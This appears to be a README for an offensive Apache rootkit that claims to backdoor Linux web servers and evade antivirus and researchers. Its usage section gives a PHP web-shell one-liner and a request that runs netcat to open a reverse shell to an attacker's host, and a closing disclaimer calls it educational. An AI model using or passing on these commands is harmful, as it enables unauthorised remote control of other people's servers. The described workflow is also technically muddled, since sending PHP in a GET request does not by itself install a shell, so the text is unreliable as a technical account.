# AIpacheRootkit

This rootkit targets the Apache web server running on a Linux machine. It injects a backdoor into the Apache service, allowing remote execution of commands on the compromised machine. The rootkit uses polymorphism and anti-debugging techniques to evade detection by antivirus software and security researchers.

## Installation

To install the rootkit, follow these steps:

1. Clone the repository: `git clone https://github.com/Z3r0nom1/AIpacheRootkit.git`
2. `cd` into the root directory of the repository: `cd AIpacheRootkit`
3. Run the setup script: `sudo ./setup.sh`
4. Compile the rootkit: `make`

## Usage

Once the rootkit is installed, you can use it to obtain a reverse shell by following these steps:

1. Connect to the compromised machine over the network
2. Send a GET request to the Apache service with the following payload:
    `<?php echo shell_exec($_GET['cmd']); ?>`
3. Open a reverse shell by sending the following GET request:
    `http://<target-ip>/index.php?cmd=nc -e /bin/bash <attacker-ip> <attacker-port>`

Make sure to replace `<target-ip>`, `<attacker-ip>`, and `<attacker-port>` with the appropriate values for your network configuration.

## Disclaimer

This rootkit is intended for educational and testing purposes only. Use at your own risk. The creators of this rootkit are not responsible for any illegal activities carried out using this software.
